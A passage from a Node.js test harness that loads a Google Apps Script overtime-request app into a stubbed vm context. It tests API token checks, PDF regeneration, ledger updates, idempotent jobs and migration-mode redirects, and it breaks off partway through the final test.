#!/usr/bin/env node
// GAS harness: loads every src/*.gs into one Node vm context with stubbed GAS globals and
// exercises doPost routing (Sebastian / internal vps.* / migration-mode forwarding),
// browser-function refusal, doGet moved page, and the cutover operator functions.
// Run: node tools/gas-harness/run.js   (exit code 0 = all passed)
'use strict';

const fs = require('fs');
const path = require('path');
const vm = require('vm');

const SRC = path.resolve(__dirname, '..', '..', 'src');

// ---------------------------------------------------------------- tiny test runner
const results = [];
function test(name, fn) {
  try {
    fn();
    results.push({ name, ok: true });
  } catch (e) {
    results.push({ name, ok: false, err: e && e.stack ? e.stack : String(e) });
  }
}
function assert(cond, msg) { if (!cond) throw new Error('assert failed: ' + msg); }
function eq(a, b, msg) {
  if (JSON.stringify(a) !== JSON.stringify(b)) {
    throw new Error('expected ' + JSON.stringify(b) + ' got ' + JSON.stringify(a) + (msg ? ' (' + msg + ')' : ''));
  }
}
function throwsMatch(fn, re, msg) {
  try { fn(); } catch (e) {
    if (re.test(String(e && e.message))) return;
    throw new Error('wrong error: ' + (e && e.message) + (msg ? ' (' + msg + ')' : ''));
  }
  throw new Error('expected throw' + (msg ? ' (' + msg + ')' : ''));
}

// ---------------------------------------------------------------- fake Sheets
function a1ToRC(a1) {
  const m = /^([A-Z]+)(\d+)$/.exec(a1);
  let col = 0;
  for (const ch of m[1]) col = col * 26 + (ch.charCodeAt(0) - 64);
  return [Number(m[2]), col];
}
class FakeRange {
  constructor(sheet, r, c, nr, nc) { Object.assign(this, { sheet, r, c, nr, nc }); }
  getValues() {
    const out = [];
    for (let i = 0; i < this.nr; i++) {
      const row = [];
      for (let j = 0; j < this.nc; j++) {
        const rr = this.sheet.data[this.r - 1 + i];
        const v = rr ? rr[this.c - 1 + j] : undefined;
        row.push(v === undefined ? '' : v);
      }
      out.push(row);
    }
    return out;
  }
  getValue() { return this.getValues()[0][0]; }
  setValues(vals) {
    for (let i = 0; i < this.nr; i++) for (let j = 0; j < this.nc; j++) this.sheet.set(this.r + i, this.c + j, vals[i][j]);
    return this;
  }
  setValue(v) { this.sheet.set(this.r, this.c, v); return this; }
  setNumberFormat() { return this; }
  setFontWeight() { return this; }
  setBackground() { return this; }
  setFontColor() { return this; }
  setFontSize() { return this; }
  setHorizontalAlignment() { return this; }
  setVerticalAlignment() { return this; }
}
class FakeSheet {
  constructor(parent, name, data) { this.parent = parent; this.name = name; this.data = data || []; this.id = Math.floor(Math.random() * 1e6); }
  getName() { return this.name; }
  getParent() { return this.parent; }
  getSheetId() { return this.id; }
  getLastRow() { let n = this.data.length; while (n > 0 && (this.data[n - 1] || []).every(v => v === '' || v == null)) n--; return n; }
  getLastColumn() { return this.data.reduce((m, r) => Math.max(m, r.length), 0); }
  set(r, c, v) { while (this.data.length < r) this.data.push([]); const row = this.data[r - 1]; while (row.length < c) row.push(''); row[c - 1] = v; }
  getRange(r, c, nr, nc) {
    if (typeof r === 'string') { const [rr, cc] = a1ToRC(r); return new FakeRange(this, rr, cc, 1, 1); }
    return new FakeRange(this, r, c, nr || 1, nc || 1);
  }
  getDataRange() { return new FakeRange(this, 1, 1, Math.max(1, this.getLastRow()), Math.max(1, this.getLastColumn())); }
  appendRow(row) { this.data.splice(this.getLastRow(), 0, row.slice()); }
  deleteRow(r) { this.data.splice(r - 1, 1); }
  setFrozenRows() {} setRowHeight() {} setColumnWidth() {}
}
class FakeSpreadsheet {
  constructor(id, sheets) { this.id = id; this.sheets = {}; for (const k of Object.keys(sheets || {})) this.sheets[k] = new FakeSheet(this, k, sheets[k]); }
  getId() { return this.id; }
  getSpreadsheetTimeZone() { return 'Asia/Tokyo'; }
  getSheetByName(n) { return this.sheets[n] || null; }
  insertSheet(n) { this.sheets[n] = new FakeSheet(this, n, []); return this.sheets[n]; }
}

// ---------------------------------------------------------------- JST formatter
function formatDate(d, tz, pattern) {
  const off = (tz === 'UTC' || tz === 'Etc/UTC') ? 0 : 9 * 3600 * 1000;
  const x = new Date(d.getTime() + off);
  const p2 = n => String(n).padStart(2, '0');
  const map = { yyyy: String(x.getUTCFullYear()), MM: p2(x.getUTCMonth() + 1), dd: p2(x.getUTCDate()),
    HH: p2(x.getUTCHours()), mm: p2(x.getUTCMinutes()), ss: p2(x.getUTCSeconds()) };
  return pattern.replace(/'([^']*)'|yyyy|MM|dd|HH|mm|ss/g, (m, lit) => lit !== undefined ? lit : map[m]);
}

// ---------------------------------------------------------------- world (fresh per test)
const SEB_TOKEN = 'seb-token-0123456789abcdef0123456789abcdef';
const VPS_TOKEN = 'vps-token-fedcba9876543210fedcba9876543210XYZ';
const ORIGIN = 'https://overtime.example.test';

const REQ_HEADER = ['requestId', 'requestType(overtime/holiday)', 'status(submitted/approved/canceled)', 'dept', 'workerName',
  'workerEmail', 'targetDate', 'approvedMinutes', 'approvedBy', 'reason', 'reasonDetail', 'workContent',
  'pdfGeneratedAt', 'pdfFileId', 'pdfFolderId', 'submittedAt', 'approvedAt', 'approvedBy2', 'approvedAt2'];
const WL_HEADER = ['requestId', 'actualStartAt', 'actualEndAt', 'actualMinutes', 'breakMinutes', 'netMinutes', 'updatedAt', 'updatedBy'];

function makeWorld(opts) {
  opts = opts || {};
  const log = [];
  const calls = [];
  const props = Object.assign({ SEBASTIAN_API_TOKEN: SEB_TOKEN, VPS_INTERNAL_TOKEN: VPS_TOKEN }, opts.props || {});
  const propFaults = { readThrows: null, writeThrows: null }; // RegExp on the key: simulate quota / service errors
  const lockState = { free: opts.lockFree !== false, held: false };
  const db = new FakeSpreadsheet('DB1', {
    Settings: [['説明'], ['key', 'value', 'memo'],
      ['PDF_MODE', 'direct（直接書込方式）'], ['TEMPLATE_SSID', 'TPL1'], ['PDF_ROOT_FOLDER_ID', 'ROOT1'], ['ACCUMULATION_SS_ID', 'ACC1']],
    Requests: [REQ_HEADER,
      ['R-1', 'overtime', 'approved', '加工班', '山田', '', '2026-11-25', 60, 'boss@x', 'r', '', '', '', '', '', '', '', '', ''],
      ['R-2', 'holiday', 'approved', '組立班', '佐藤', '', '2026-11-25', 480, 'boss@x', 'r', '', '', new Date('2026-11-25T09:00:00Z'), 'OLDPDF', 'F0', '', '', '', ''],
      ['R-3', 'overtime', 'submitted', '加工班', '鈴木', '', '2026-11-25', 60, '', 'r', '', '', '', '', '', '', '', '', ''],
      ['R-4', 'overtime', 'approved', '加工班', '田中', '', '2026-11-25', 60, 'boss@x', 'r', '', '', '', '', '', '', '', '', '']],
    WorkLogs: [['注釈'], WL_HEADER,
      ['R-1', '2026-11-25 17:20:00', '2026-11-25 19:00:00', 100, 10, 90, '', ''],
      ['R-2', '2026-11-25 08:00:00', '2026-11-25 17:00:00', 540, 60, 480, '', '']],
    FormMap: [['type', 'dept', 'formId', 'isActive'], ['overtime', '加工班', 'FORM-A', true], ['holiday', '加工班', 'FORM-B', true], ['overtime', '組立班', 'FORM-C', true]],
  });
  const ACC = [
    '管理番号', '申請種別', '作業実施日', '曜日', '部署', '作業員ID', '氏名', '理由', '補足理由', '業務内容',
    '承認時間(分)', '承認時間', '開始時刻', '終了時刻', '実働(分)', '実働', '休憩(分)', '休憩', '実残業/実働(分)', '実残業/実働',
    '申請日', '1次承認日', '1次承認者', '2次承認日', '2次承認者', '承認状態', 'PDF'];
  const accHeader = opts.badLedgerHeader ? ACC.map((h, i) => i === 3 ? '曜' : h) : ACC;
  const ledger = new FakeSpreadsheet('ACC1', { '残業_2026年度': [accHeader], '休日出勤_2026年度': [ACC] });
  const forms = { 'FORM-A': { accepting: true }, 'FORM-B': { accepting: false }, 'FORM-C': { accepting: true } };
  let triggers = (opts.triggers || ['pollNewResponses_', 'nightlyUpdateAllForms_', 'morningBatchNoMail_', 'syncAllMasters'])
    .map((fn, i) => ({ fn, id: 'T' + i, type: 'CLOCK' }));
  const fetchPlan = opts.fetch || { code: 200, body: '{"ok":true,"pong":"vps"}' };
  const users = Object.assign({ active: 'imaizumi@x', effective: 'imaizumi@x' }, opts.users || {});

  const ctx = {
    console: { log: (...a) => log.push(a.join(' ')), warn: (...a) => log.push(a.join(' ')), error: (...a) => log.push(a.join(' ')) },
    Logger: { log: m => log.push(String(m)) },
    JSON, Math, Date, Object, Array, String, Number, Boolean, RegExp, Error, Map, Set, isNaN, parseInt, parseFloat, encodeURIComponent, decodeURIComponent,
    PropertiesService: { getScriptProperties: () => ({
      getProperty: k => { if (propFaults.readThrows && propFaults.readThrows.test(k)) throw new Error('Service error'); return k in props ? props[k] : null; },
      setProperty: (k, v) => { if (propFaults.writeThrows && propFaults.writeThrows.test(k)) throw new Error('quota exceeded'); props[k] = String(v); calls.push(['setProperty', k]); },
      deleteProperty: k => { delete props[k]; },
      getProperties: () => Object.assign({}, props),
    }) },
    LockService: { getScriptLock: () => ({
      tryLock: () => { calls.push(['tryLock']); if (!lockState.free) return false; lockState.held = true; return true; },
      waitLock: () => { calls.push(['waitLock']); if (!lockState.free) throw new Error('Lock timeout'); lockState.held = true; },
      releaseLock: () => { lockState.held = false; },
      hasLock: () => lockState.held,
    }) },
    SpreadsheetApp: {
      getActive: () => { calls.push(['getActive']); return db; },
      openById: id => { calls.push(['openById', id]); if (id === 'ACC1' && !opts.ledgerMissing) return ledger; throw new Error('not found ' + id); },
      flush: () => {},
      getUi: () => ({ createMenu: () => { const m = { items: [], addItem: (a, b) => { m.items.push(b); return m; }, addSeparator: () => m, addToUi: () => { calls.push(['menu', m.items]); } }; return m; }, alert: () => {} }),
    },
    Utilities: { formatDate, sleep: () => {}, getUuid: () => require('crypto').randomUUID() },
    Session: {
      getActiveUser: () => ({ getEmail: () => users.active }),
      getEffectiveUser: () => ({ getEmail: () => users.effective }),
      getScriptTimeZone: () => 'Asia/Tokyo',
    },
    ContentService: { MimeType: { JSON: 'json' }, createTextOutput: t => ({ content: t, setMimeType() { return this; }, getContent() { return this.content; } }) },
    HtmlService: {
      XFrameOptionsMode: { ALLOWALL: 'ALLOWALL' },
      createHtmlOutput: h => ({ html: h, setTitle(t) { this.title = t; return this; }, setXFrameOptionsMode() { return this; }, getContent() { return this.html; } }),
      createTemplateFromFile: name => ({ evaluate: () => ({ html: 'TEMPLATE:' + name, setTitle(t) { this.title = t; return this; }, setXFrameOptionsMode() { return this; }, getContent() { return this.html; } }) }),
      createHtmlOutputFromFile: name => ({ getContent: () => '' }),
    },
    UrlFetchApp: { fetch: (url, o) => {
      calls.push(['fetch', url, o]);
      if (fetchPlan.throws) throw new Error(fetchPlan.throws);
      return { getResponseCode: () => fetchPlan.code, getContentText: () => fetchPlan.body };
    } },
    ScriptApp: {
      EventType: { CLOCK: 'CLOCK' },
      getService: () => ({ getUrl: () => 'https://script.google.com/macros/s/X/exec' }),
      getProjectTriggers: () => triggers.map(t => ({ getHandlerFunction: () => t.fn, getEventType: () => t.type, getUniqueId: () => t.id, _t: t })),
      deleteTrigger: tr => { triggers = triggers.filter(t => t !== tr._t); calls.push(['deleteTrigger', tr._t.fn]); },
      newTrigger: fn => { const b = { timeBased: () => b, everyDays: () => b, atHour: () => b, nearMinute: () => b, everyMinutes: () => b,
        create: () => { triggers.push({ fn, id: 'N' + triggers.length, type: 'CLOCK' }); calls.push(['newTrigger', fn]); } }; return b; },
      getOAuthToken: () => 'tok',
      getScriptId: () => 'SCRIPT-ID-1',
    },
    // Drive: every file is a PDF in date folder F0 under PDF_ROOT_FOLDER_ID (ROOT1), except
    // OUTSIDE (PDF in another tree, e.g. production PDF seen from staging), NOTPDF (a spreadsheet), DEEP (5 levels down).
    DriveApp: { getFileById: id => {
      calls.push(['getFileById', id]);
      if (id === 'MISSING') throw new Error('No item with the given ID could be found');
      const folder = (fid, parent) => ({ getId: () => fid, getParents: () => iter(parent ? [parent] : []) });
      const iter = arr => { let i = 0; return { hasNext: () => i < arr.length, next: () => arr[i++] }; };
      const root = folder('ROOT1', folder('MY-DRIVE'));
      let parent = folder('F0', root);
      if (id === 'OUTSIDE') parent = folder('PROD-DATE', folder('PROD-ROOT', folder('MY-DRIVE')));
      if (id === 'DEEP') parent = folder('D4', folder('D3', folder('D2', folder('D1', root))));
      return {
        getMimeType: () => (id === 'NOTPDF' ? 'application/vnd.google-apps.spreadsheet' : 'application/pdf'),
        getParents: () => iter([parent]),
        setTrashed: () => { calls.push(['trash', id]); if (id === 'FOREIGN') throw new Error('no permission'); },
      };
    } },
    FormApp: { openById: id => { calls.push(['FormApp.openById', id]); const f = forms[id]; if (!f) throw new Error('no form');
      return { isAcceptingResponses: () => f.accepting, setAcceptingResponses: v => { f.accepting = v; calls.push(['setAccepting', id, v]); }, getResponses: () => [] }; } },
    CacheService: { getScriptCache: () => ({ get: () => null, put: () => {} }) },
    CalendarApp: { subscribeToCalendar: () => { calls.push(['CalendarApp']); throw new Error('no'); } },
  };
  vm.createContext(ctx);
  for (const f of fs.readdirSync(SRC).filter(f => f.endsWith('.gs')).sort()) {
    vm.runInContext(fs.readFileSync(path.join(SRC, f), 'utf8'), ctx, { filename: f });
  }

  // Stub the heavy Drive/PDF/ledger functions: record the order they are called in.
  const pdfFail = opts.pdfFail || {};
  function fakeGenerate(kind) {
    return function(requestId, wlOverride) {
      calls.push([kind, requestId, wlOverride || null]);
      if (pdfFail[requestId]) throw new Error('PDFエクスポートに失敗しました: HTTP 500');
      const req = ctx.getRequestById_(requestId);
      if (req.status !== 'approved') throw new Error('未承認のためPDF生成できません。');
      if (req.pdfGeneratedAt && req.pdfFileId) return { already: true, pdfFileId: req.pdfFileId };
      const { sh, idx } = ctx.getSheetHeaderIndex_('Requests', 1);
      const id = 'PDF-' + requestId + '-' + calls.length;
      sh.getRange(req.rowNo, idx.pdfGeneratedAt + 1).setValue(new Date('2026-11-26T00:00:00Z'));
      sh.getRange(req.rowNo, idx.pdfFileId + 1).setValue(id);
      sh.getRange(req.rowNo, idx.pdfFolderId + 1).setValue('FOLDER-1');
      return { ok: true, pdfFileId: id, pdfName: 'x.pdf', folderId: 'FOLDER-1' };
    };
  }
  ctx.generatePdfDirect_ = fakeGenerate('generatePdfDirect_');
  ctx.generatePdfForRequest_ = fakeGenerate('generatePdfForRequest_');
  // Like the real one: writes/overwrites the row keyed by requestId; swallows failures (opts.upsertSilentFail = writes nothing).
  ctx.upsertAccumulationRow_ = id => {
    calls.push(['upsertAccumulationRow_', id]);
    if (opts.upsertSilentFail) return;
    const req = ctx.getRequestById_(id);
    const sh = ledger.sheets[(req.requestType === 'overtime' ? '残業' : '休日出勤') + '_2026年度'];
    const n = sh.data.findIndex((r, i) => i > 0 && r[0] === id);
    if (n < 0) sh.appendRow([id]);
  };
  ctx.removeAccumulationRow_ = (id, t, d) => calls.push(['removeAccumulationRow_', id, t, ctx.fmtDate_(d, 'yyyy-MM-dd')]);
  ctx.appendToAccumulationSS_ = d => calls.push(['appendToAccumulationSS_', ctx.fmtDate_(d, 'yyyy-MM-dd')]);
  const realRebuild = ctx.rebuildAccumulationSS;
  ctx.__realRebuild = realRebuild;
  ctx.rebuildAccumulationSS = () => { calls.push(['rebuildAccumulationSS']); return { rebuilt: true, processed: 12, sheets: 2, written: 12, backups: ['残業_2026年度_backup_x'], durationMs: 5 }; };
  ctx.batchGeneratePdfs_ = d => { calls.push(['batchGeneratePdfs_', ctx.fmtDate_(d, 'yyyy-MM-dd')]); return { ok: 2, skip: 1, fail: 1, errors: ['R-9 (加工班/X): boom'] }; };

  return { ctx, db, ledger, props, propFaults, calls, log, forms, lockState, get triggers() { return triggers; },
    post(obj) { const raw = typeof obj === 'string' ? obj : JSON.stringify(obj); const out = ctx.doPost({ postData: { contents: raw } }); return { raw: out.getContent(), json: JSON.parse(out.getContent()) }; },
    names(kind) { return calls.filter(c => c[0] === kind); },
    reqRow(id) { return ctx.getRequestById_(id); } };
}

function vps(action, extra) { return Object.assign({ token: VPS_TOKEN, action }, extra || {}); }

// ================================================================= tests
// --- Sebastian path unchanged when migration mode is off
test('sebastian ping works with Sebastian token (mode off)', () => {
  const w = makeWorld();
  const r = w.post({ token: SEB_TOKEN, action: 'ping' }).json;
  eq(r.ok, true); assert(r.pong, 'pong');
});
test('sebastian wrong token -> unauthorized, invalid JSON -> invalid JSON', () => {
  const w = makeWorld();
  eq(w.post({ token: 'nope', action: 'ping' }).json, { error: 'unauthorized' });
  assert(/^invalid JSON: /.test(w.post('{bad').json.error), 'invalid JSON');
  eq(w.post({ token: SEB_TOKEN, action: 'zzz' }).json, { error: 'unknown action: zzz', action: 'zzz' });
});
test('sebastian completeOvertime without requestId keeps today error shape', () => {
  const w = makeWorld();
  eq(w.post({ token: SEB_TOKEN, action: 'completeOvertime' }).json, { error: 'requestId is required', action: 'completeOvertime' });
});

// --- internal endpoint auth
test('internal: missing VPS_INTERNAL_TOKEN -> unauthorized, nothing read', () => {
  const w = makeWorld({ props: { VPS_INTERNAL_TOKEN: '' } });
  const r = w.post(vps('vps.ping')).json;
  eq([r.ok, r.error, r.retryable], [false, 'unauthorized', false]);
  eq(w.names('getActive').length, 0, 'DB not opened');
});
test('internal: wrong token / Sebastian token -> unauthorized', () => {
  const w = makeWorld();
  eq(w.post(vps('vps.ping', { token: 'x' })).json.error, 'unauthorized');
  eq(w.post(vps('vps.ping', { token: SEB_TOKEN })).json.error, 'unauthorized');
  eq(w.post({ internal: true, token: SEB_TOKEN, action: 'internal.ping' }).json.error, 'unauthorized');
});
test('internal: token equal to SEBASTIAN_API_TOKEN is refused even if it matches', () => {
  const w = makeWorld({ props: { VPS_INTERNAL_TOKEN: SEB_TOKEN } });
  eq(w.post(vps('vps.ping', { token: SEB_TOKEN })).json.error, 'unauthorized');
});
test('internal: vps.ping and internal.ping report version, mode, settings', () => {
  const w = makeWorld();
  const r = w.post(vps('vps.ping')).json;
  eq([r.ok, r.migrationMode, r.dbId, r.settings.ACCUMULATION_SS_ID, r.settings.pdfModeIsDirect], [true, false, 'DB1', 'ACC1', true]);
  eq(w.post({ internal: true, token: VPS_TOKEN, action: 'internal.ping' }).json.ok, true);
  eq(w.post(vps('vps.nope', { jobId: 'j' })).json.error, 'bad_request');
});
test('internal: mutating action without jobId -> bad_request', () => {
  const w = makeWorld();
  const r = w.post(vps('vps.renderPdf', { requestId: 'R-1' })).json;
  eq([r.ok, r.error, r.retryable], [false, 'bad_request', false]);
});

// --- renderPdf semantics
test('renderPdf auto: PDF_MODE "contains direct" -> generatePdfDirect_, returns sheet columns', () => {
  const w = makeWorld();
  const r = w.post(vps('vps.renderPdf', { requestId: 'R-1', jobId: 'j1' })).json;
  eq([r.ok, r.pdf.status, r.pdf.method], [true, 'created', 'direct']);
  assert(/^PDF-R-1-/.test(r.pdfFileId), 'pdfFileId'); eq(r.pdfFolderId, 'FOLDER-1');
  eq(r.pdfGeneratedAt, '2026-11-26 09:00:00', 'JST');
  eq(w.names('generatePdfDirect_').length, 1); eq(w.names('upsertAccumulationRow_').length, 0, 'ledger none by default');
  eq(w.names('tryLock').length, 1, 'took the script lock');
});
test('renderPdf: PDF_MODE without "direct" -> XLOOKUP; mode xlookup forces XLOOKUP', () => {
  const w = makeWorld();
  w.db.sheets.Settings.data[2][1] = 'xlookup';
  eq(w.post(vps('vps.renderPdf', { requestId: 'R-1', jobId: 'a' })).json.pdf.method, 'xlookup');
  const w2 = makeWorld();
  eq(w2.post(vps('vps.renderPdf', { requestId: 'R-1', jobId: 'b', mode: 'xlookup' })).json.pdf.method, 'xlookup');
  eq(w2.names('generatePdfForRequest_').length, 1);
});
test('renderPdf idempotency: same jobId replays stored result without re-running', () => {
  const w = makeWorld();
  const a = w.post(vps('vps.renderPdf', { requestId: 'R-1', jobId: 'job-1', ledger: 'always' })).json;
  const b = w.post(vps('vps.renderPdf', { requestId: 'R-1', jobId: 'job-1', ledger: 'always' })).json;
  eq(b.replayed, true); eq(b.pdfFileId, a.pdfFileId);
  eq(w.names('generatePdfDirect_').length, 1); eq(w.names('upsertAccumulationRow_').length, 1);
  assert(w.props['VPSJOB_job-1'], 'stored in ScriptProperties');
  eq(w.post(vps('vps.upsertLedger', { requestId: 'R-1', jobId: 'job-1' })).json.error, 'bad_request', 'jobId reuse for other action');
});
test('renderPdf: existing PDF -> already (no second PDF)', () => {
  const w = makeWorld();
  const r = w.post(vps('vps.renderPdf', { requestId: 'R-2', jobId: 'x' })).json;
  eq([r.ok, r.pdf.status, r.pdfFileId], [true, 'already', 'OLDPDF']);
});
test('renderPdf secondary: trash old PDF + clear 3 columns BEFORE direct generation, ledger always', () => {
  const w = makeWorld();
  w.db.sheets.Settings.data[2][1] = 'xlookup'; // secondary ignores PDF_MODE
  const r = w.post(vps('internal.regenerate', { requestId: 'R-2', jobId: 's1', args: { reason: 'secondary', oldPdfFileId: 'OLDPDF' } })).json;
  eq([r.ok, r.trash.status, r.pdf.status, r.pdf.method, r.ledger.status], [true, 'trashed', 'created', 'direct', 'upserted']);
  const order = w.calls.map(c => c[0]).filter(n => ['trash', 'generatePdfDirect_', 'upsertAccumulationRow_'].includes(n));
  eq(order, ['trash', 'generatePdfDirect_', 'upsertAccumulationRow_']);
  eq(w.names('trash')[0][1], 'OLDPDF');
  assert(r.pdfFileId !== 'OLDPDF', 'new pdf id');
});
test('renderPdf regenerate when VPS already cleared the sheet columns: trash by oldPdfFileId only', () => {
  const w = makeWorld();
  const sh = w.db.sheets.Requests; sh.data[2][12] = ''; sh.data[2][13] = ''; sh.data[2][14] = '';
  const r = w.post(vps('vps.renderPdf', { requestId: 'R-2', jobId: 'e1', mode: 'auto', oldPdfFileId: 'OLDPDF', ledger: 'always' })).json;
  eq([r.trash.status, r.pdf.status], ['trashed', 'created']);
});
test('renderPdf regenerate: trash failure (other owner) is recorded and regeneration continues', () => {
  const w = makeWorld();
  const sh = w.db.sheets.Requests; sh.data[2][13] = 'FOREIGN';
  const r = w.post(vps('vps.renderPdf', { requestId: 'R-2', jobId: 'f1', mode: 'secondary' })).json;
  eq([r.ok, r.trash.status, r.pdf.status], [true, 'error', 'created']);
});
test('renderPdf regenerate replay after expiry: sheet has newer PDF -> not trashed, already', () => {
  const w = makeWorld();
  w.db.sheets.Requests.data[2][13] = 'NEWPDF';
  const r = w.post(vps('vps.renderPdf', { requestId: 'R-2', jobId: 'g1', mode: 'secondary', oldPdfFileId: 'OLDPDF' })).json;
  eq([r.trash.status, r.pdf.status, r.pdfFileId], ['skipped', 'already', 'NEWPDF']);
  eq(w.names('trash').length, 0);
});
test('afterApprove: no actualEndAt -> no PDF and no ledger; with actualEndAt -> PDF then ledger', () => {
  const w = makeWorld();
  const r = w.post(vps('internal.afterApprove', { requestId: 'R-4', jobId: 'aa1' })).json;
  eq([r.ok, r.pdf.status, r.pdf.reason, r.ledger.status], [true, 'skipped', 'work_not_done', 'skipped']);
  const r2 = w.post(vps('internal.afterApprove', { requestId: 'R-1', jobId: 'aa2' })).json;
  eq([r2.pdf.status, r2.ledger.status], ['created', 'upserted']);
});
test('afterApprove: PDF exception -> ledger NOT written, pdf_failed retryable, not stored', () => {
  const w = makeWorld({ pdfFail: { 'R-1': true } });
  const r = w.post(vps('internal.afterApprove', { requestId: 'R-1', jobId: 'pf' })).json;
  eq([r.ok, r.error, r.retryable, r.ledger.status], [false, 'pdf_failed', true, 'skipped']);
  assert(!w.props.VPSJOB_pf, 'retryable failure not stored');
});
test('afterComplete: not approved -> no PDF but ledger always; sebastian source uses XLOOKUP', () => {
  const w = makeWorld();
  const r = w.post(vps('internal.afterComplete', { requestId: 'R-3', jobId: 'c1', args: { source: 'screen' } })).json;
  eq([r.pdf.status, r.pdf.reason, r.ledger.status], ['skipped', 'not_approved', 'upserted']);
  const r2 = w.post(vps('internal.afterComplete', { requestId: 'R-1', jobId: 'c2', args: { source: 'sebastian' } })).json;
  eq([r2.pdf.method, r2.ledger.status], ['xlookup', 'upserted']);
});
test('afterComplete with workLog override passes it to the PDF function', () => {
  const w = makeWorld();
  const wl = { actualStartAt: '2026-11-25 17:20:00', actualEndAt: '2026-11-25 19:00:00', actualMinutes: 100, breakMinutes: 10, netMinutes: 90 };
  w.post(vps('internal.afterComplete', { requestId: 'R-1', jobId: 'wl', args: { source: 'screen', workLog: wl } }));
  eq(w.names('generatePdfDirect_')[0][2], wl);
});
test('expect mismatch -> row_not_synced (retryable), nothing generated', () => {
  const w = makeWorld();
  const r = w.post(vps('vps.renderPdf', { requestId: 'R-1', jobId: 'ex', expect: { status: 'canceled', actualEndAt: '2026-11-25 19:00:00' } })).json;
  eq([r.ok, r.error, r.retryable], [false, 'row_not_synced', true]);
  eq(w.names('generatePdfDirect_').length, 0);
  const ok = w.post(vps('vps.renderPdf', { requestId: 'R-1', jobId: 'ex', expect: { status: 'approved', actualEndAt: '2026-11-25 19:00:00' } })).json;
  eq(ok.ok, true, 'same jobId re-runs after a retryable failure');
});
test('busy: script lock not available -> busy retryable, not stored; later succeeds', () => {
  const w = makeWorld({ lockFree: false });
  const r = w.post(vps('vps.renderPdf', { requestId: 'R-1', jobId: 'b1' })).json;
  eq([r.ok, r.error, r.retryable], [false, 'busy', true]);
  w.lockState.free = true;
  eq(w.post(vps('vps.renderPdf', { requestId: 'R-1', jobId: 'b1' })).json.ok, true);
});

// --- ledger actions
test('upsertLedger / removeLedgerRow call today\'s ledger functions', () => {
  const w = makeWorld();
  eq(w.post(vps('vps.upsertLedger', { requestId: 'R-1', jobId: 'u1' })).json.ledger.status, 'upserted');
  const r = w.post(vps('vps.removeLedgerRow', { requestId: 'R-3', requestType: 'overtime', targetDate: '2026-11-25', jobId: 'd1' })).json;
  eq([r.ok, r.ledger.status], [true, 'removed']);
  eq(w.names('removeAccumulationRow_')[0].slice(1), ['R-3', 'overtime', '2026-11-25']);
  eq(w.post(vps('vps.removeLedgerRow', { requestId: 'R-3', requestType: 'x', targetDate: '2026-11-25', jobId: 'd2' })).json.error, 'bad_request');
});
test('ledger guards: header mismatch and unavailable ledger are reported, nothing written', () => {
  const w = makeWorld({ badLedgerHeader: true });
  const r = w.post(vps('vps.upsertLedger', { requestId: 'R-1', jobId: 'h1' })).json;
  eq([r.ok, r.error, r.retryable], [false, 'ledger_header_mismatch', false]);
  eq(w.names('upsertAccumulationRow_').length, 0);
  const w2 = makeWorld({ ledgerMissing: true });
  const r2 = w2.post(vps('vps.upsertLedger', { requestId: 'R-1', jobId: 'h2' })).json;
  eq([r2.error, r2.retryable], ['ledger_unavailable', true]);
  eq(w2.names('upsertAccumulationRow_').length, 0, 'does not create a new ledger');
});
test('afterDelete: trash old PDF, clear columns, remove ledger row', () => {
  const w = makeWorld();
  const r = w.post(vps('internal.afterDelete', { requestId: 'R-2', jobId: 'del', args: { oldPdfFileId: 'OLDPDF' } })).json;
  eq([r.ok, r.trash.status, r.ledger.status], [true, 'trashed', 'removed']);
  eq(w.reqRow('R-2').pdfFileId, '');
});

// --- morning batch
test('vps.morningBatch is disabled (data-safety low-4): bad_request, no BatchLogs row, nothing run', () => {
  const w = makeWorld();
  const r = w.post(vps('vps.morningBatch', { targetDate: '2026-11-25', jobId: 'mb1' })).json;
  eq([r.ok, r.error, r.retryable], [false, 'bad_request', false]);
  eq(w.db.sheets.BatchLogs, undefined, 'no BatchLogs tab/row');
  eq(w.names('batchGeneratePdfs_').length + w.names('appendToAccumulationSS_').length, 0);
});
test('vpsMorningBatch_ (kept for manual use) still runs the same 3 steps as morningBatchNoMail_', () => {
  const w = makeWorld();
  w.ctx._vpsInternalCall_ = true;
  const r = w.ctx.vpsMorningBatch_({ targetDate: '2026-11-25' });
  eq([r.ok, r.targetDate, r.counts, r.ledger.status], [true, '2026-11-25', { ok: 2, skip: 1, fail: 1 }, 'rewritten']);
  eq(w.db.sheets.BatchLogs.data[1].slice(1), ['morningBatchNoMail', '2026-11-25', 2, 1, 1, 'R-9 (加工班/X): boom']);
});

// --- migration mode
function migrated(extra) {
  return makeWorld(Object.assign({}, extra || {}, { props: Object.assign({ MIGRATED_TO_URL: ORIGIN }, (extra && extra.props) || {}) }));
}
test('migration: doGet shows moved page preserving ?page=&date=, target=_top', () => {
  const w = migrated();
  const out = w.ctx.doGet({ parameter: { page: 'approve2', date: '2026-11-25' } });
  const h = out.getContent();
  assert(h.includes('href="' + ORIGIN + '/?page=approve2&amp;date=2026-11-25" target="_top"'), 'button href ' + h);
  assert(h.includes('<base target="_top">'), 'base target');
  assert(h.includes('新しいアドレスへ移りました'), 'Japanese text');
  eq(w.names('getActive').length, 0, 'DB not opened');
  const plain = w.ctx.doGet({ parameter: {} }).getContent();
  assert(plain.includes('href="' + ORIGIN + '/" target="_top"') && !plain.includes('setTimeout'), 'no params');
});
test('migration off: doGet renders the app template as before', () => {
  const w = makeWorld();
  eq(w.ctx.doGet({ parameter: { page: 'top' } }).getContent(), 'TEMPLATE:top');
});
test('migration: every browser-callable function is refused with Japanese message', () => {
  const w = migrated();
  const htmlFns = new Set();
  for (const f of fs.readdirSync(SRC).filter(f => f.endsWith('.html'))) {
    for (const m of fs.readFileSync(path.join(SRC, f), 'utf8').matchAll(/\b(api_[A-Za-z0-9_]+)\s*\(/g)) htmlFns.add(m[1]);
  }
  assert(htmlFns.size >= 30, 'found google.script.run functions: ' + htmlFns.size);
  for (const fn of htmlFns) {
    assert(typeof w.ctx[fn] === 'function', 'exists ' + fn);
    throwsMatch(() => w.ctx[fn]('x', 'y'), /新しいアドレスへ移りました/, fn);
  }
  // every public (non-underscore) function outside Cutover.gs/Internal.gs and the web entry points
  const publicFns = [];
  for (const f of fs.readdirSync(SRC).filter(f => f.endsWith('.gs') && !['Cutover.gs', 'Internal.gs'].includes(f))) {
    for (const m of fs.readFileSync(path.join(SRC, f), 'utf8').matchAll(/^function\s+([A-Za-z0-9_$]+)\s*\(/gm)) {
